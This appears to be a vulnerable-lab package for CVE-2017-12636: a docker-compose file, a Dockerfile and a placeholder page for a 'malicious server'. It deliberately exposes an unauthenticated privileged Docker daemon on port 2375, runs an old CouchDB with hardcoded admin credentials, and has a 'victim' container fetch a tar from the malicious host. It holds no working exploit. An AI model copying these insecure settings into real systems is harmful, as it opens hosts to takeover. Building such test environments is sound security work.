{
    "files": [
        {
            "location": "./../../dockers/CVE-2017-12636/custom_no_tool/docker-compose.yml",
            "content": "services:\n  vulnerable:\n    image: docker:20.10-dind\n    privileged: true\n    environment:\n      - DOCKER_TLS_CERTDIR=\n    command: [\"dockerd-entrypoint.sh\", \"--host=tcp://0.0.0.0:2375\", \"--tls=false\"]\n    ports:\n      - \"2375:2375\"\n    networks:\n      - cve-net\n    volumes:\n      - vulnerable-docker:/var/lib/docker\n    restart: unless-stopped\n\n  malicious_server:\n    build:\n      context: ./malicious_server\n    ports:\n      - \"8000:8000\"\n    networks:\n      - cve-net\n\n  victim:\n    image: alpine:3.18\n    depends_on:\n      - vulnerable\n      - malicious_server\n      - couchdb\n    environment:\n      - DOCKER_HOST=tcp://vulnerable:2375\n    networks:\n      - cve-net\n    command: [\"sh\", \"-c\", \"apk add --no-cache curl docker && curl -s http://malicious_server:8000/malicious.tar -o /tmp/malicious.tar && echo 'Placeholder tar fetched; skipping docker load.' && sleep infinity\"]\n\n  couchdb:\n    image: apache/couchdb:1.6.5\n    environment:\n      - COUCHDB_USER=admin\n      - COUCHDB_PASSWORD=secret\n    ports:\n      - \"5984:5984\"\n    networks:\n      - cve-net\n    restart: unless-stopped\n\n  couchdb_init:\n    image: alpine:3.18\n    depends_on:\n      - couchdb\n    networks:\n      - cve-net\n    entrypoint: [\"sh\", \"-c\", \"apk add --no-cache curl && \\\n      while ! curl -s http://couchdb:5984/ > /dev/null; do echo 'Waiting for CouchDB...'; sleep 2; done && \\\n      curl -X PUT http://admin:secret@couchdb:5984/testdb && \\\n      curl -X POST http://admin:secret@couchdb:5984/testdb -H 'Content-Type: application/json' -d '{\\\"_id\\\": \\\"doc1\\\", \\\"value\\\": \\\"sample\\\"}' && \\\n      echo 'Test database and document created.' && sleep infinity\"]\n\nnetworks:\n  cve-net:\n    driver: bridge\n\nvolumes:\n  vulnerable-docker:\n  docker-socket:"
        },
        {
            "location": "./../../dockers/CVE-2017-12636/custom_no_tool/malicious_server/Dockerfile",
            "content": "FROM python:3-alpine\nWORKDIR /app\nCOPY index.html .\nEXPOSE 8000\nCMD [\"python\", \"-m\", \"http.server\", \"8000\", \"--directory\", \"/app\"]"
        },
        {
            "location": "./../../dockers/CVE-2017-12636/custom_no_tool/malicious_server/index.html",
            "content": "<html>\n  <head><title>Placeholder</title></head>\n  <body>\n    <h1>This is a placeholder page for the malicious server.</h1>\n    <p>No actual payload is provided.</p>\n  </body>\n</html>"
        }
    ],
    "directory_tree": "CVE-2017-12636/custom_no_tool"
}